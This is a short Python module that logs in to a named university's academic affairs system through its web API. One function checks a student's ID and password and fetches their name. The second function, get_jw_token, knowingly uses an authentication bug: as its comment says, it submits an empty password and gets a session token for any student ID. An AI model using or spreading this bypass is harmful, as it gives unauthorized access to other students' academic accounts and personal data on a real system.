import json

import requests


def get_student_name(student_id: int, password: str) -> tuple:
    """
    与教务系统校对账号密码

    - 字段说明
        - username 学号
        - password 密码
        - rd 随机数，可以随机，也可以不填，我也不知道来干嘛的

    :param student_id: 学号
    :param password: 教务系统的密码
    :return: 一个元组，通常我规定第一个为bool，用来判定是否成功获取数据。
    :raise OSError: 一般错误为超时，学校系统炸了，与我们无关
    """
    url = 'http://ecampus.nfu.edu.cn:2929/jw-privilegei/User/r-login'
    post_session = requests.session()
    data = {
        'username': student_id,
        'password': password,
        'rd': ''
    }

    try:
        # 因为教务系统经常抽风，故设置1秒超时
        response = post_session.post(url, data=data, timeout=1)
        token = json.loads(response.text)['msg']

        if not token:
            return False, '学号或密码错误!'

    except (OSError, json.decoder.JSONDecodeError):
        return False, '教务系统错误，请稍后再试'

    else:
        url = 'http://ecampus.nfu.edu.cn:2929/jw-privilegei/User/r-getMyself'
        data = {'jwloginToken': token}

        try:
            response = post_session.post(url, data=data, timeout=1)
            name = json.loads(response.text)['msg']['name']

            if not name:
                return False, '教务系统错误，请稍后再试'

            return True, name

        except (OSError, KeyError):
            return False, '教务系统错误，请稍后再试'


def get_jw_token(student_id: int) -> tuple:
    """
    登陆教务系统
    :param student_id: 学号，基于教务系统的Bug，登陆时，密码直接提交空字符串就可以了
    :return: 一个元组，通常我规定第一个为bool，用来判定是否成功获取数据。
    :raise OSError: 一般错误为超时，学校系统炸了，与我们无关
    """

    url = 'http://ecampus.nfu.edu.cn:2929/jw-privilegei/User/r-login'
    post_session = requests.session()
    data = {
        'username': student_id,
        'password': '',
        'rd': ''
    }

    try:
        response = post_session.post(url, data=data, timeout=1)
        token = json.loads(response.text)['msg']

        if not token:  # 如果教务系统反200，且获取不到 token，可能是学校修复了这个 bug。
            return False, '不可预知错误，请稍后再试！'

    except (OSError, json.decoder.JSONDecodeError):
        return False, '教务系统错误，请稍后再试'

    else:
        return True, token
